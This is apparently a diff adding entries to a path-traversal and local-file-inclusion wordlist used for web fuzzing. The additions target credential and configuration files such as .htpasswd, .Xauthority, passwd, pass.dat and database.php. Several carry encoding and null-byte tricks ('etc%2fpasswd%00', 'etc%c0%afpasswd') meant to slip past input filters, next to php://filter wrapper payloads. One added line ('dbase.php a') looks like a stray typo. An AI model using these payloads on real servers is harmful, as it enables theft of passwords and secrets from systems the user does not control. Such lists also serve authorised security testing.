@@ -16,6 +16,8 @@ _config.php
 .cshrc
 .forward
 .gtkrc
+.htaccess
+.htpasswd
 .login
 .logout
 .mysql_history
@@ -39,6 +41,7 @@ _config.php
 .ssh/identity.pub
 .viminfo
 .wm_style
+.Xauthority
 .Xdefaults
 .xinitrc
 .Xresources
@@ -80,6 +83,7 @@ _config.php
 ~/.xinitrc
 ~/.Xresources
 ~/.xsession
+admin/access_log
 admin/install.php
 admin/logs/system.log
 administrator/inbox
@@ -561,6 +565,12 @@ config.inc.php
 config.js
 config.php
 core/config.php
+data.php
+database.asp
+database.js
+database.php
+db.php
+dbase.php a
 dev
 dev/.initramfs
 dev/.udev
@@ -13738,6 +13748,12 @@ etc/zsh30/zlogout
 etc/zsh30/zprofile
 etc/zsh30/zshenv
 etc/zsh30/zshrc
+etc%2fpasswd
+etc%2fpasswd%00
+etc%5cpasswd
+etc%5cpasswd%00
+etc%c0%afpasswd
+etc%c0%afpasswd%00
 home
 home/$USER/.config/Code/CachedProfilesData/__default__profile__/extensions.user.cache
 home/$USER/.config/Code/Cookies
@@ -15278,6 +15294,8 @@ mailer/VERSION
 master.passwd
 media
 media/root
+member/.htpasswd
+members/.htpasswd
 mnt
 mysql/bin/my.ini
 MySQL/data/{HOST}.err
@@ -15368,6 +15386,9 @@ opt/xampp/logs/error_log
 opt/xampp/logs/error_log%00
 opt/xampp/logs/error.log
 opt/xampp/logs/error.log%00
+pass.dat
+passwd
+passwd.dat
 php://filter/convert.base64-encode/resource=config
 php://filter/convert.base64-encode/resource=index
 php://input
